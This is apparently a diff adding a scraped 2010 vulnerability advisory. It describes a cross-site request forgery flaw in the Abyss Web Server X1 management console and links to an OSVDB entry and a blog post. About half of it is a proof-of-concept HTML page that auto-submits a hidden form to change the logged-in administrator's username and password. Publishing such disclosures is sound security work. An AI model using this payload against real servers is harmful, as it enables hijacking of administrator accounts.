@@ -1,0 +1,36 @@
+http://osvdb.org/show/osvdb/64693
+
+<http://osvdb.org/show/osvdb/64693>
+http://cross-site-scripting.blogspot.com/2010/05/abyss-web-server-x1-xsrf.html
+ :
+
+Abyss Web Server X1
+XSRF<http://cross-site-scripting.blogspot.com/2010/05/abyss-web-server-x1-xsrf.html>
+A cross-site request forgery vunlerability in the Abyss Web Server
+X1<http://www.aprelium.com/abyssws/download.php> management
+console can be exploited to change both the username and password of the
+logged in user.
+PoC:
+ view plain<http://cross-site-scripting.blogspot.com/2010/05/abyss-web-server-x1-xsrf.html#>
+print<http://cross-site-scripting.blogspot.com/2010/05/abyss-web-server-x1-xsrf.html#>
+?<http://cross-site-scripting.blogspot.com/2010/05/abyss-web-server-x1-xsrf.html#>
+
+   1. <html>
+   2.     <body onload="document.forms[0].submit()">
+   3.         <form method="post" action="
+   http://localhost:9999/console/credentials">
+   4.             <input type="hidden" name="/console/credentials/login"
+   5.                    value="new_username" />
+   6.             <input type="hidden" name=
+   "/console/credentials/password/$pass1"
+   7.                    value="new_password" />
+   8.             <input type="hidden" name=
+   "/console/credentials/password/$pass2"
+   9.                    value="new_password" />
+   10.             <input type="hidden" name="/console/credentials/bok"
+   11.                    value="%C2%A0%C2%A0OK%C2%A0%C2%A0" />
+   12.         </form>
+   13.     </body>
+   14. </html>
+
+<http://cross-site-scripting.blogspot.com/2010/05/abyss-web-server-x1-xsrf.html>
